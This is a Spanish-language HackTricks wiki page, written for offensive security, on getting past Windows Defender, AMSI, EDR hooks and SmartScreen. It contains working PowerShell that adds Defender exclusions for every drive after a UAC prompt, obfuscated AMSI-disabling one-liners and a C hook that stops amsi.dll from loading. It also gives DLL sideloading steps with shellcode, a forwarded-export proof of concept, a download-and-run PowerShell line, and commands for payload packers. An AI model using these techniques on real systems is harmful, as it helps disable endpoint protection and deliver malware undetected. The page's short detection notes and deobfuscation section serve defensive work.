# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita inicialmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para detener Windows Defender de funcionar.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener Windows Defender simulando otro AV.
- [Deshabilitar Defender si eres administrador](basic-powershell-for-pentesters/README.md)

### Cebo de UAC estilo instalador antes de manipular Defender

Los loaders públicos que se hacen pasar por trucos de juego frecuentemente se distribuyen como instaladores sin firmar de Node.js/Nexe que primero **piden al usuario elevación** y solo entonces neutralizan Defender. El flujo es simple:

1. Comprobar el contexto administrativo con `net session`. El comando solo tiene éxito cuando quien lo ejecuta posee privilegios de administrador, así que un fallo indica que el loader se está ejecutando como usuario estándar.
2. Se relanza inmediatamente a sí mismo con el verbo `RunAs` para activar el esperado UAC consent prompt mientras preserva la línea de comandos original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Las víctimas ya creen que están instalando “cracked” software, por lo que el prompt normalmente se acepta, otorgando al malware los derechos que necesita para cambiar la política de Defender.

### Exclusiones generales `MpPreference` para cada letra de unidad

Una vez con privilegios elevados, GachiLoader-style chains maximizan los puntos ciegos de Defender en lugar de deshabilitar el servicio por completo. El loader primero mata el GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) y luego aplica **exclusiones extremadamente amplias** para que cada perfil de usuario, directorio del sistema y disco extraíble queden sin posibilidad de ser escaneados:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observaciones clave:

- El bucle recorre todos los sistemas de archivos montados (D:\, E:\, unidades USB, etc.), por lo que **cualquier payload futuro dejado en cualquier parte del disco es ignorado**.
- La exclusión de la extensión `.sys` mira hacia el futuro: los atacantes se reservan la opción de cargar controladores no firmados más adelante sin volver a alterar Defender.
- Todos los cambios quedan bajo `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitiendo a etapas posteriores confirmar que las exclusiones persisten o ampliarlas sin reactivar UAC.

Dado que no se detiene ningún servicio de Defender, las comprobaciones de estado ingenuas siguen reportando “antivirus activo” aunque la inspección en tiempo real nunca toque esas rutas.

## **AV Evasion Methodology**

Actualmente, los AVs usan diferentes métodos para comprobar si un archivo es malicioso o no: static detection, dynamic analysis, y, en los EDRs más avanzados, behavioural analysis.

### **Static detection**

Static detection se logra marcando cadenas maliciosas conocidas o arrays de bytes en un binary o script, y también extrayendo información del propio archivo (p. ej. file description, company name, digital signatures, icon, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente hayan sido analizadas y marcadas como maliciosas. Hay un par de formas de eludir este tipo de detection:

- **Encryption**

Si encriptas el binary, no habrá forma para el AV de detectar tu programa, pero necesitarás algún loader para desencriptarlo y ejecutar el programa en memoria.

- **Obfuscation**

A veces lo único que necesitas es cambiar algunas strings en tu binary o script para pasar el AV, pero esto puede ser una tarea que consume mucho tiempo dependiendo de lo que intentas obfuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas maliciosas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena forma de comprobar la static detection de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente divide el archivo en múltiples segmentos y luego obliga a Defender a escanear cada uno individualmente; de este modo puede decirte exactamente qué strings o bytes de tu binary están marcados.

Te recomiendo ver esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctico.

### **Dynamic analysis**

Dynamic analysis es cuando el AV ejecuta tu binary en un sandbox y observa actividad maliciosa (p. ej. intentar desencriptar y leer las contraseñas del navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser más complicada de manejar, pero aquí hay algunas cosas que puedes hacer para evadir sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una gran forma de evadir la dynamic analysis de los AVs. Los AVs tienen muy poco tiempo para escanear archivos para no interrumpir el flujo de trabajo del usuario, así que usar sleeps largos puede alterar el análisis de binaries. El problema es que muchos sandboxes de los AVs pueden simplemente saltarse el sleep dependiendo de su implementación.
- **Checking machine's resources** Normalmente los sandboxes tienen muy pocos recursos (p. ej. < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser creativo aquí: por ejemplo comprobando la temperatura de la CPU o incluso las velocidades de los ventiladores; no todo estará implementado en el sandbox.
- **Machine-specific checks** Si quieres apuntar a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el especificado; si no coincide, puedes hacer que tu programa salga.

Resulta que el nombre del equipo del Sandbox de Microsoft Defender es HAL9TH; por tanto, puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH significa que estás dentro del sandbox de Defender, así que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros muy buenos consejos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como hemos dicho antes en este post, **public tools** eventualmente **serán detectadas**, así que deberías hacerte una pregunta:

Por ejemplo, si quieres volcar LSASS, **realmente necesitas usar mimikatz**? ¿O podrías usar otro proyecto menos conocido que también vuelque LSASS?

La respuesta correcta probablemente sea la segunda. Tomando mimikatz como ejemplo, probablemente es una de las piezas de malware más, si no la más, señaladas por AVs y EDRs; aunque el proyecto es muy bueno, también es una pesadilla trabajar con él para evadir AVs, así que busca alternativas para lo que intentas lograr.

> [!TIP]
> Al modificar tus payloads para evadir, asegúrate de **desactivar el envío automático de muestras** en Defender, y por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr evasión a largo plazo. Si quieres comprobar si tu payload es detectado por un AV en particular, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo allí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza usar DLLs para evasión**; en mi experiencia, los archivos DLL suelen ser **mucho menos detectados** y analizados, así que es un truco muy simple para evitar detección en algunos casos (si tu payload puede ejecutarse como DLL, claro).

Como podemos ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el EXE payload tiene una tasa de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el orden de búsqueda de DLL usado por el loader posicionando tanto la aplicación víctima como los payload(s) maliciosos uno junto al otro.

Puedes buscar programas susceptibles a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explores por ti mismo programas DLL Hijackable/Sideloadable**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas públicamente conocidos DLL Sideloadable, podrías ser detectado fácilmente.

Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar no hará que se ejecute tu payload, ya que el programa espera funciones específicas dentro de esa DLL; para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que hace un programa desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y permitiendo encargarse de la ejecución de tu payload.

Voy a usar el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente para una DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Te recomiendo encarecidamente ver el VOD de twitch de S3cur3Th1sSh1t sobre DLL Sideloading y también el video de ippsec para profundizar en lo que hemos discutido.

### Abusar de Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es un KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copiar-pegar):
1) Copia la DLL del sistema firmada en una carpeta escribible
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca un `NCRYPTPROV.dll` malicioso en la misma carpeta. Un DllMain mínimo es suficiente para obtener ejecución de código; no necesitas implementar la función reenviada para activar DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activar el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run

Hunting tips:
- Focus on forwarded exports where the target module is not a KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- You can enumerate forwarded exports with tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideas de detección/defensa:
- Monitorea LOLBins (p. ej., rundll32.exe) cargando DLLs firmadas desde rutas no del sistema, seguidas de la carga de non-KnownDLLs con el mismo nombre base desde ese directorio
- Genera alertas sobre cadenas proceso/módulo como: `rundll32.exe` → `keyiso.dll` no perteneciente al sistema → `NCRYPTPROV.dll` en rutas escribibles por el usuario
- Aplica políticas de integridad de código (WDAC/AppLocker) y deniega write+execute en los directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es solo un juego de gato y ratón; lo que funciona hoy puede detectarse mañana, así que nunca confíes en una sola herramienta; si es posible, intenta encadenar múltiples técnicas de evasión.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs often place **user-mode inline hooks** on `ntdll.dll` syscall stubs. To bypass those hooks, you can generate **direct** or **indirect** syscall stubs that load the correct **SSN** (Número de servicio del sistema) and transition to kernel mode without executing the hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI fue creado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AVs solo podían escanear **files on disk**, por lo que si de alguna manera podías ejecutar payloads **directly in-memory**, el AV no podía hacer nada para evitarlo, ya que no tenía suficiente visibilidad.

La funcionalidad AMSI está integrada en estos componentes de Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permite a las soluciones antivirus inspeccionar el comportamiento de los scripts exponiendo el contenido del script en una forma que no está encriptada ni ofuscada.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Fíjate cómo antepone `amsi:` y luego la ruta al ejecutable desde el que se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aun así fuimos detectados en memoria debido a AMSI.

Además, a partir de **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para la ejecución en memoria. Por eso se recomienda usar versiones más bajas de .NET (como 4.7.2 o anteriores) para la ejecución en memoria si quieres evadir AMSI.

Hay un par de formas de evitar AMSI:

- **Obfuscation**

Dado que AMSI trabaja principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen múltiples capas, por lo que obfuscation podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan fácil evadirlo. Aunque, a veces, todo lo que necesitas es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto haya sido marcado.

- **AMSI Bypass**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente incluso ejecutando como un usuario sin privilegios. Debido a este fallo en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forcing an Error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) hará que no se inicie ningún escaneo para el proceso actual. Originalmente esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para evitar su uso generalizado.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Todo lo que hizo falta fue una línea de código de powershell para dejar AMSI inutilizable para el proceso actual de powershell. Esa línea, por supuesto, ha sido marcada por AMSI, así que se necesita alguna modificación para poder usar esta técnica.

Aquí tienes un AMSI bypass modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será detectado una vez que esta publicación salga, así que no deberías publicar ningún código si tu plan es permanecer sin ser detectado.

**Memory Patching**

Esta técnica fue inicialmente descubierta por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones que devuelvan el código E_INVALIDARG; de este modo, el resultado del escaneo real será 0, lo que se interpreta como un resultado limpio.

> [!TIP]
> Por favor lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

También existen muchas otras técnicas usadas para bypass de AMSI con powershell; consulta [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

### Bloqueando AMSI impidiendo la carga de amsi.dll (LdrLoadDll hook)

AMSI se inicializa solo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un hook en modo usuario sobre `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan escaneos en ese proceso.

Esquema de implementación (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona en PowerShell, WScript/CScript y custom loaders por igual (cualquier cosa que de otro modo cargaría AMSI).
- Combínalo con alimentar scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Se ha visto usado por loaders ejecutados a través de LOLBins (p. ej., `regsvr32` que llama a `DllRegisterServer`).

La herramienta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** también genera scripts para eludir AMSI.
La herramienta **[https://amsibypass.com/](https://amsibypass.com/)** también genera scripts para eludir AMSI que evitan firmas mediante funciones definidas por el usuario aleatorizadas, variables, expresiones de caracteres y aplican mayúsculas/minúsculas aleatorias a las palabras clave de PowerShell para evitar firmas.

**Eliminar la firma detectada**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell versión 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## Registro de PowerShell

PowerShell logging es una característica que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para eludir el registro de PowerShell, puedes usar las siguientes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Use Powershell version 2**: Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin que AMSI los escanee. Puedes hacerlo así: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para lanzar un powershell sin defensas (esto es lo que usa `powerpick` de Cobalt Strike).


## Ofuscación

> [!TIP]
> Varias técnicas de ofuscación dependen de cifrar datos, lo que aumentará la entropía del binario y facilitará que AVs y EDRs lo detecten. Ten cuidado con esto y quizá aplica cifrado solo a secciones específicas de tu código que sean sensibles o necesiten ocultarse.

### Desofuscando binarios .NET protegidos por ConfuserEx

Al analizar malware que usa ConfuserEx 2 (o forks comerciales) es común enfrentarse a varias capas de protección que bloquearán los descompiladores y sandboxes. El flujo de trabajo a continuación restaura de forma fiable un IL casi original que luego puede descompilarse a C# en herramientas como dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx cifra cada *method body* y lo descifra dentro del constructor estático del *module* (`<Module>.cctor`). Esto también parchea el checksum del PE, por lo que cualquier modificación hará que el binario falle. Usa **AntiTamperKiller** para localizar las tablas de metadatos cifradas, recuperar las XOR keys y reescribir un ensamblado limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio unpacker.

2.  Symbol / control-flow recovery – alimenta el archivo *clean* a **de4dot-cex** (un fork de de4dot con soporte para ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecciona el perfil de ConfuserEx 2  
• de4dot deshará el flattening del control-flow, restaurará los namespaces, clases y nombres de variables originales y descifrará las cadenas constantes.

3.  Proxy-call stripping – ConfuserEx reemplaza llamadas directas a métodos con envoltorios ligeros (también llamados *proxy calls*) para dificultar aún más la descompilación. Elimínalos con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs normales de .NET como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones envoltorio opacas (`Class8.smethod_10`, …).

4.  Limpieza manual – ejecuta el binario resultante en dnSpy, busca grandes blobs Base64 o uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el *payload* real. A menudo el malware lo almacena como un arreglo de bytes codificado TLV inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa, útil cuando se trabaja en una estación de trabajo desconectada.

> 🛈  ConfuserEx produce un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como IOC para triage automático de muestras.

#### Comando en una línea
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer una mayor seguridad del software mediante [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de plantillas de C++ que dificultará un poco la vida de la persona que quiera crackear la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 capaz de ofuscar distintos archivos PE, incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor de código metamórfico simple para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de ofuscación de código de grano fino para lenguajes soportados por LLVM que utiliza ROP (return-oriented programming). ROPfuscator ofusca un programa a nivel de código ensamblador transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un .NET PE Crypter escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Es importante notar que los ejecutables firmados con un certificado de firma **de confianza** **no activarán SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
